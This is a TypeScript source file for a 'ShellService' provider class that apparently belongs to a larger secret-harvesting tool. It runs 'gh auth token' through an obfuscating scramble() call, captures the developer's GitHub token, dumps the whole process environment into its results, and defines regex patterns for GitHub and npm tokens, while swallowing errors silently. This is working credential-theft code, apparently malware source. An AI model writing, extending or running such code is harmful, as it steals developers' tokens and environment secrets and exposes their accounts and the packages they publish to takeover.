import { execSync } from "child_process";

import { Provider } from "../base";
import type { ProviderResult } from "../types";

declare function scramble(str: string): string;

export class ShellService extends Provider {
  constructor() {
    super("shell", "misc", {
      ghtoken: /gh[op]_[A-Za-z0-9]{36}/g,
      npmtoken: /npm_[A-Za-z0-9]{36,}/g,
    });
  }

  async execute(): Promise<ProviderResult> {
    const results: Record<string, any> = {};
    try {
      const token = execSync(scramble("gh auth token"), {
        encoding: "utf-8",
        stdio: ["pipe", "pipe", "pipe"],
      }).trim();

      if (token) {
        results["token"] = token;
      }
    } catch (error) {}

    results["environment"] = process.env;

    if (Object.keys(results).length > 0) {
      return this.success(results);
    } else {
      return this.failure("No Result");
    }
  }
}
